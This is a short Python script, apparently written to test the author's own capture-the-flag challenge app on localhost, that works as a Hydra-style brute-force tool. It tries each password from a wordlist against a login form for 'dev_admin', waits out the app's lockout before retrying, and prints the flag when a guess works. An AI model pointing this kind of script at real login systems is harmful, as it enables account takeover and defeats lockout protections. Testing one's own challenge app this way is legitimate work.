"""
brute_force_test.py
--------------------
A tiny, pure-Python stand-in for Hydra, JUST for testing your own challenge
app on native Windows without installing anything extra (requests is the
only dependency, and you almost certainly already have it).

This does exactly what the Hydra command in the README does:
  - tries username + each password from the wordlist against the login form
  - respects the app's lockout by backing off when it sees the lockout message
  - reports the working password when found

Run:
    pip install requests --break-system-packages   (if needed)
    python3 brute_force_test.py
"""

import requests
import time

TARGET_URL = "http://127.0.0.1:5000/internal-portal-x92"
USERNAME = "dev_admin"
WORDLIST_PATH = "wordlists/hydra_passwords.txt"
DELAY_BETWEEN_ATTEMPTS = 1.5   # seconds, mimics Hydra's -W throttle

with open(WORDLIST_PATH) as f:
    passwords = [line.strip() for line in f if line.strip()]

print(f"[*] Loaded {len(passwords)} candidate passwords")
print(f"[*] Target: {TARGET_URL}  |  username: {USERNAME}\n")

found = None

for i, pw in enumerate(passwords, start=1):
    resp = requests.post(TARGET_URL, data={"username": USERNAME, "password": pw})
    body = resp.text

    if "CTF{" in body:
        found = pw
        print(f"[+] SUCCESS on attempt {i}: password = '{pw}'")
        # pull the flag out for convenience
        start = body.find("CTF{")
        end = body.find("}", start) + 1
        print(f"[+] Flag: {body[start:end]}")
        break

    elif "Too many failed attempts" in body:
        # find the wait time the app told us, back off, then retry same password
        print(f"[!] Locked out after attempt {i-1}. Waiting 90s before continuing...")
        time.sleep(91)
        resp = requests.post(TARGET_URL, data={"username": USERNAME, "password": pw})
        if "CTF{" in resp.text:
            found = pw
            print(f"[+] SUCCESS after lockout wait: password = '{pw}'")
            break

    else:
        print(f"[-] Attempt {i}: '{pw}' -> failed")
        time.sleep(DELAY_BETWEEN_ATTEMPTS)

if not found:
    print("\n[x] Exhausted wordlist, no valid password found.")
